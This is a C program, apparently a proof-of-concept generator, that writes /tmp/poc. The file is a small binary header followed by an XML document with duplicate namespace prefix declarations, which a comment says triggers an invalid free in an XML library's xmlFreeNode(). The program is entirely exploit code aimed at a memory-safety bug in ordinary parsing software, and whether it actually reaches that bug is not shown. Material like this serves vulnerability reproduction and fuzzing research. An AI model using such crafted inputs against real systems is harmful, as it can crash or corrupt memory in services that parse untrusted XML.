#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* XML payload that triggers bad_free in xmlFreeNode() */
    const char *xml = "<?xml version=\"1.0\"?>"
                      "<root xmlns:p=\"http://a\" xmlns:p=\"http://b\">"
                      "<child xmlns:q=\"http://c\" xmlns:q=\"http://d\"/>"
                      "</root>";
    size_t xml_len = strlen(xml);

    /* ByteStream container format:
     * - 4 bytes: options (0)
     * - 8 bytes: encoding length (0, empty encoding)
     * - 8 bytes: XML payload length
     * - XML payload bytes
     */
    uint32_t options = 0;
    uint64_t enc_len = 0;
    uint64_t payload_len = (uint64_t)xml_len;

    /* Write little-endian values byte by byte for portability */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* options = 0 */

    for (int i = 0; i < 8; i++) {
        fputc(0, f); /* enc_len = 0 */
    }

    for (int i = 0; i < 8; i++) {
        fputc((payload_len >> (8 * i)) & 0xFF, f);
    }

    fwrite(xml, 1, xml_len, f);

    fclose(f);
    return 0;
}